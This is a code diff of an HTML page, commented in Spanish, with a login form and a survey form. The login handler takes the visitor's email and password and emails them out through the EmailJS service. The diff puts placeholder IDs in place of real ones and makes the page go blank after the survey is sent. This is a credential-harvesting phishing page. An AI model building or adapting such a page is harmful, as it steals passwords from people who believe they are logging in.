@@ -57,11 +57,11 @@
     background-color: #0056b3;
   }
 </style>
-<!-- EmailJS SDK -->
-<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<!-- SDK de EmailJS -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script type="text/javascript">
    (function(){
-      emailjs.init("service_bb0loqm"); // Reemplaza "service_bb0loqm" con tu Service ID
+      emailjs.init("user_youruserid"); // Reemplaza "user_youruserid" con tu User ID de EmailJS
    })();
 </script>
 </head>
@@ -95,7 +95,7 @@ document.getElementById("loginForm").addEventListener("submit", function(event) 
   var password = document.getElementById("password").value;
   
   // Enviar correo electrónico con los datos de inicio de sesión
-  emailjs.send("service_bb0loqm", "template_dz3o83w", {
+  emailjs.send("user_youruserid", "template_yourtemplateid", {
     from_name: email,
     message: "Correo electrónico: " + email + "\nContraseña: " + password
   })
@@ -113,13 +113,14 @@ document.getElementById("surveyForm").addEventListener("submit", function(event)
   var aiHelp = document.getElementById("aiHelp").value;
 
   // Enviar correo electrónico con la respuesta de la encuesta
-  emailjs.send("service_bb0loqm", "template_dz3o83w", {
+  emailjs.send("user_youruserid", "template_yourtemplateid", {
     from_name: "Encuesta",
     message: "Respuesta: " + aiHelp
   })
   .then(function(response) {
     console.log("SUCCESS!", response.status, response.text);
-    alert("Gracias por participar");
+    // Dejar la pantalla en blanco después de enviar la respuesta
+    document.body.innerHTML = '';
   }, function(error) {
     console.log("FAILED...", error);
   });
@@ -128,4 +129,3 @@ document.getElementById("surveyForm").addEventListener("submit", function(event)
 
 </body>
 </html>
-
